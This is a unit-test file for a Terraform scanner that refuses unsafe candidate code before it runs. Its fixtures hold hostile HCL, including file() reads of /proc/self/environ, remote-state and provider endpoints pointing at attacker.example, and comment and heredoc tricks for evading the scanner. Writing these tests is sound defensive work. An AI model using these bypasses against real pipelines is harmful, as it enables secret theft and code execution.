import os, shutil, subprocess, sys, tempfile, unittest

HERE = os.path.dirname(os.path.abspath(__file__))
SCAN = os.path.join(HERE, "..", "dev_candidate_scan.py")

VERSIONS = '''terraform {
  required_version = "1.10.5"
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "5.80.0"
    }
  }
  backend "s3" {
    bucket = "ranikun-dev-tfstate-124495093425"
    key    = "dev/carelog/terraform.tfstate"
    region = "ap-northeast-2"
  }
}
provider "aws" {
  region = "ap-northeast-2"
}
'''
MAIN = '''data "aws_caller_identity" "current" {}

resource "aws_s3_bucket" "b" {
  bucket = "example-bucket"
}

module "x" {
  source = "../../../modules/x"
}
'''
MODULE = 'resource "aws_iam_role" "r" {\n  name = "example"\n}\n'
LOCK = '# lock\nprovider "registry.terraform.io/hashicorp/aws" {\n  version = "5.80.0"\n}\n'


def write(path, text):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(text)


def make_tree(base, versions=VERSIONS, main=MAIN, lock=LOCK):
    """Build a repo-shaped checkout: environments/dev/carelog plus modules/x."""
    write(os.path.join(base, "environments/dev/carelog/versions.tf"), versions)
    write(os.path.join(base, "environments/dev/carelog/main.tf"), main)
    write(os.path.join(base, "environments/dev/carelog/.terraform.lock.hcl"), lock)
    write(os.path.join(base, "modules/x/main.tf"), MODULE)


def scan(candidate_mutator=None, trusted_mutator=None):
    tmp = tempfile.mkdtemp()
    cand = os.path.join(tmp, "candidate")
    trusted = os.path.join(tmp, "trusted")
    make_tree(trusted)
    make_tree(cand)
    if candidate_mutator:
        candidate_mutator(cand)
    if trusted_mutator:
        trusted_mutator(trusted)
    summary = os.path.join(tmp, "scan.md")
    p = subprocess.run([sys.executable, "-I", SCAN, "--candidate-root", cand, "--trusted-root", trusted,
                        "--root", "carelog", "--summary", summary], capture_output=True, text=True)
    with open(summary, encoding="utf-8") as fh:
        return p.returncode, p.stdout + p.stderr


def cand_file(cand, rel, text):
    write(os.path.join(cand, rel), text)


ROOT = "environments/dev/carelog"


class ScanTests(unittest.TestCase):
    def assertFails(self, rc_text, needle):
        rc, text = rc_text
        self.assertEqual(rc, 2, text)
        self.assertIn("Scan: FAIL", text)
        self.assertIn(needle, text)

    def test_clean_candidate_passes(self):
        rc, text = scan()
        self.assertEqual(rc, 0, text)
        self.assertIn("Scan: PASS", text)

    def test_data_external_rejected(self):
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf",
                                                  'data "external" "x" {\n  program = ["sh"]\n}\n')),
                         "data source type 'external' not allowed")

    def test_data_http_rejected(self):
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf",
                                                  'data "http" "x" {\n  url = "https://example.com"\n}\n')),
                         "data source type 'http' not allowed")

    def test_null_resource_rejected(self):
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf",
                                                  'resource "null_resource" "x" {}\n')),
                         "resource type 'null_resource' not allowed")

    def test_provisioner_rejected(self):
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf",
                                                  'resource "aws_s3_bucket" "b" {\n  bucket = "x"\n'
                                                  '  provisioner "local-exec" {\n    command = "true"\n  }\n}\n')),
                         "provisioner not allowed")

    def test_extra_provider_in_required_providers_rejected(self):
        bad = VERSIONS.replace('  required_providers {\n',
                               '  required_providers {\n    http = {\n      source = "hashicorp/http"\n    }\n')
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/versions.tf", bad)),
                         "required provider 'http' not allowed")

    def test_provider_block_other_than_aws_rejected(self):
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", 'provider "local" {}\n')),
                         "provider 'local' not allowed")

    def test_non_local_module_source_rejected(self):
        bad = MAIN.replace('../../../modules/x', 'git::https://example.com/mod.git')
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/main.tf", bad)),
                         "non-local module source not allowed")

    def test_module_source_escaping_checkout_rejected(self):
        def outside(c):
            os.makedirs(os.path.join(os.path.dirname(c), "outside"), exist_ok=True)
            write(os.path.join(os.path.dirname(c), "outside/main.tf"), MODULE)
            cand_file(c, ROOT + "/main.tf", MAIN.replace('../../../modules/x', '../../../../outside'))
        self.assertFails(scan(outside), "escapes the candidate checkout")

    def test_symlink_rejected(self):
        def link(c):
            os.symlink("/etc/hostname", os.path.join(c, ROOT, "link.tf"))
        self.assertFails(scan(link), "symlink not allowed")

    def test_tf_json_rejected(self):
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf.json", "{}")), "*.tf.json not allowed")

    def test_committed_terraform_dir_rejected(self):
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/.terraform/x", "x")),
                         "committed .terraform/ directory not allowed")

    def test_tfvars_rejected(self):
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/prod.auto.tfvars", "a = 1")),
                         "tfvars file")

    def test_override_rejected(self):
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/main_override.tf", "")), "override files")

    def test_cloud_block_rejected(self):
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf",
                                                  'terraform {\n  cloud {\n    organization = "x"\n  }\n}\n')),
                         "cloud block not allowed")

    def test_lock_file_must_match_main(self):
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/.terraform.lock.hcl", LOCK + "# extra\n")),
                         ".terraform.lock.hcl differs from main")

    def test_backend_key_change_rejected(self):
        changed = VERSIONS.replace("dev/carelog/terraform.tfstate", "dev/platform/terraform.tfstate")
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/versions.tf", changed)),
                         "s3 backend block differs from main")

    def test_backend_outside_versions_rejected(self):
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf",
                                                  'terraform {\n  backend "local" {}\n}\n')),
                         "backend 'local' outside versions.tf or not s3")


    # --- bypass regressions (review finding 1-3): each must FAIL the scan ---

    def assertFailsAll(self, rc_text, needles):
        rc, text = rc_text
        self.assertEqual(rc, 2, text)
        self.assertIn("Scan: FAIL", text)
        for needle in needles:
            self.assertIn(needle, text)

    def test_bypass_remote_state_http_backend_rejected(self):
        # Remote state read through an http backend, with file() used to pull local data in.
        hcl = ('data "terraform_remote_state" "x" {\n  backend = "http"\n  config = {\n'
               '    address = "https://attacker.example/state"\n  }\n}\n'
               'locals {\n  leak = file("/proc/self/environ")\n}\n')
        self.assertFailsAll(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                            ["data source type 'terraform_remote_state' not allowed",
                             "file-family function 'file' not allowed"])

    def test_terraform_remote_state_rejected_even_with_s3_backend(self):
        hcl = 'data "terraform_remote_state" "x" {\n  backend = "s3"\n}\n'
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                         "data source type 'terraform_remote_state' not allowed")

    def test_file_family_functions_rejected(self):
        for fn in ["file", "fileexists", "fileset", "filebase64", "filemd5", "templatefile", "pathexpand"]:
            with self.subTest(fn=fn):
                hcl = f'locals {{\n  x = {fn}("/proc/self/environ")\n}}\n'
                self.assertFails(scan(lambda c, h=hcl: cand_file(c, ROOT + "/extra.tf", h)),
                                 f"file-family function {fn!r} not allowed")

    def test_file_function_with_space_before_paren_rejected(self):
        hcl = 'locals {\n  x = file ("/etc/hostname")\n}\n'
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)), "file-family function")

    def test_provider_endpoints_override_rejected(self):
        hcl = ('provider "aws" {\n  region = "ap-northeast-2"\n  endpoints {\n'
               '    s3 = "https://attacker.example"\n  }\n}\n')
        self.assertFailsAll(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                            ["provider 'aws' block differs from main",
                             "provider 'aws' sets denied argument 'endpoints'"])

    def test_provider_proxy_and_ca_override_rejected(self):
        for arg in ["http_proxy", "custom_ca_bundle", "insecure", "shared_credentials_files",
                    "assume_role"]:
            with self.subTest(arg=arg):
                hcl = f'provider "aws" {{\n  region = "ap-northeast-2"\n  {arg} = "x"\n}}\n'
                self.assertFails(scan(lambda c, h=hcl: cand_file(c, ROOT + "/versions.tf",
                                                                 VERSIONS.replace(
                                                                     'provider "aws" {\n  region = "ap-northeast-2"\n}\n',
                                                                     h))),
                                 f"denied argument {arg!r}")

    def test_provider_alias_block_differs_from_main_rejected(self):
        hcl = 'provider "aws" {\n  alias  = "other"\n  region = "us-east-1"\n}\n'
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                         "provider 'aws' block differs from main")

    def test_unquoted_module_git_source_rejected(self):
        hcl = 'module x {\n  source = "git::https://example.com/mod.git"\n}\n'
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                         "non-local module source not allowed")

    def test_unquoted_module_bare_source_rejected(self):
        hcl = 'module x {\n  source = git::https://example.com/mod.git\n}\n'
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                         "module source must be exactly one literal string")

    def test_module_source_from_variable_rejected(self):
        hcl = 'module "x" {\n  source = var.src\n}\n'
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                         "module source must be exactly one literal string")

    def test_unquoted_local_module_passes(self):
        bad_free = MAIN.replace('module "x"', 'module x')
        rc, text = scan(lambda c: cand_file(c, ROOT + "/main.tf", bad_free))
        self.assertEqual(rc, 0, text)

    def test_lambda_invocation_data_source_rejected(self):
        hcl = ('data "aws_lambda_invocation" "x" {\n  function_name = "f"\n'
               '  input = "{}"\n}\n')
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                         "data source type 'aws_lambda_invocation' not allowed")

    def test_kms_secrets_and_ecr_token_data_sources_rejected(self):
        for dtype in ["aws_kms_secrets", "aws_ecr_authorization_token"]:
            with self.subTest(dtype=dtype):
                hcl = f'data "{dtype}" "x" {{}}\n'
                self.assertFails(scan(lambda c, h=hcl: cand_file(c, ROOT + "/extra.tf", h)),
                                 f"data source type {dtype!r} not allowed")

    def test_unquoted_resource_local_exec_provisioner_rejected(self):
        hcl = ('resource aws_s3_bucket b {\n  bucket = "x"\n'
               '  provisioner local-exec {\n    command = "true"\n  }\n}\n')
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)), "provisioner not allowed")

    def test_unquoted_null_resource_rejected(self):
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", "resource null_resource x {}\n")),
                         "resource type 'null_resource' not allowed")

    def test_prose_in_strings_is_not_a_block(self):
        prose = ('variable "x" {\n  description = "provider rejects any other account; module names and '
                 'data source notes are fine"\n  type = string\n}\n')
        rc, text = scan(lambda c: cand_file(c, ROOT + "/extra.tf", prose))
        self.assertEqual(rc, 0, text)

    # --- round 3: comment tricks (reviewer reproduced /**/ bypasses) ---

    def test_block_comment_between_label_and_brace_rejected(self):
        hcl = 'data "terraform_remote_state" "x" /**/ {\n  backend = "http"\n}\n'
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                         "block comment /* */ not allowed")

    def test_block_comment_after_function_name_rejected(self):
        hcl = 'locals {\n  x = file/**/("/proc/self/environ")\n}\n'
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                         "block comment /* */ not allowed")

    def test_multiline_block_comment_in_header_rejected(self):
        hcl = 'module "x" /*\n*/ {\n  source = "../../../modules/x"\n}\n'
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                         "block comment /* */ not allowed")

    def test_block_comment_marker_inside_string_rejected(self):
        # Conservative: any /* in a candidate file is denied, even inside a string.
        hcl = 'locals {\n  x = "/* note"\n}\n'
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                         "block comment /* */ not allowed")

    def test_live_code_after_line_comment_still_scanned(self):
        hcl = 'locals {\n  x = 1 # harmless\n}\n# harmless\nlocals {\n  y = file("/x")\n}\n'
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                         "file-family function 'file' not allowed")

    def test_denied_text_inside_comment_fails_closed(self):
        # Rules run on raw text, so a denied call inside a comment is a false positive by design.
        hcl = ('locals {\n  x = 1 # file("/proc/self/environ")\n'
               '  y = 2 // data "terraform_remote_state" "q" {\n}\n')
        self.assertFailsAll(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                            ["file-family function 'file' not allowed",
                             "data source type 'terraform_remote_state' not allowed"])

    def test_reviewer_heredoc_hyphen_marker_bypass_rejected(self):
        # Reviewer's round-4 HCL: a hyphenated heredoc marker used to flip the stripper state.
        hcl = ('locals {\n  a = <<EO-T\n  x = "#"\n  b = file("/proc/self/environ")\nEO-T\n}\n')
        self.assertFailsAll(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                            ["heredoc marker must be a plain identifier",
                             "file-family function 'file' not allowed"])

    def test_dash_heredoc_hyphen_marker_rejected(self):
        hcl = 'locals {\n  a = <<-EO-T\n  x = 1\nEO-T\n}\n'
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                         "heredoc marker must be a plain identifier")

    def test_unicode_heredoc_marker_rejected(self):
        hcl = 'locals {\n  a = <<EOTé\n  x = 1\nEOTé\n}\n'
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                         "heredoc marker must be a plain identifier")

    def test_empty_heredoc_marker_rejected(self):
        hcl = 'locals {\n  a = <<\n  x = 1\n}\n'
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                         "heredoc marker must be a plain identifier")

    def test_plain_heredoc_still_allowed(self):
        hcl = 'locals {\n  a = <<EOT\n  hello # not a comment\nEOT\n}\n'
        rc, text = scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl))
        self.assertEqual(rc, 0, text)

    def test_comment_inside_provider_aws_block_rejected(self):
        bad = VERSIONS.replace('provider "aws" {\n  region = "ap-northeast-2"\n}\n',
                               'provider "aws" {\n  region = "ap-northeast-2" # note\n}\n')
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/versions.tf", bad)),
                         "comment not allowed inside provider 'aws' block")

    def test_comment_inside_backend_block_rejected(self):
        bad = VERSIONS.replace('    region = "ap-northeast-2"\n  }\n}',
                               '    region = "ap-northeast-2" # note\n  }\n}')
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/versions.tf", bad)),
                         "no single comment-free s3 backend block")

    def test_hash_inside_string_does_not_hide_interpolated_call(self):
        hcl = 'locals {\n  x = "# ${file("/proc/self/environ")}"\n}\n'
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                         "file-family function 'file' not allowed")

    def test_double_slash_inside_string_does_not_hide_interpolated_call(self):
        hcl = 'locals {\n  x = "https://${file("/proc/self/environ")}"\n}\n'
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                         "file-family function 'file' not allowed")

    def test_escaped_quote_keeps_string_open_for_interpolated_call(self):
        hcl = 'locals {\n  x = "a\\" ${file("/x")} # "\n}\n'
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                         "file-family function 'file' not allowed")

    def test_escaped_quote_then_comment_passes(self):
        hcl = 'locals {\n  x = "a\\"b" # "\n}\n'
        rc, text = scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl))
        self.assertEqual(rc, 0, text)

    def test_comment_marker_inside_heredoc_interpolation_still_scanned(self):
        hcl = 'locals {\n  x = <<EOT\n# ${file("/proc/self/environ")}\nEOT\n}\n'
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
                         "file-family function 'file' not allowed")

    def test_hash_text_in_heredoc_is_content_not_comment_passes(self):
        hcl = 'locals {\n  x = <<EOT\n# hello\nEOT\n}\n'
        rc, text = scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl))
        self.assertEqual(rc, 0, text)

    def test_unquoted_provider_other_than_aws_rejected(self):
        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", "provider http {}\n")),
                         "provider 'http' not allowed")


if __name__ == "__main__":
    unittest.main()
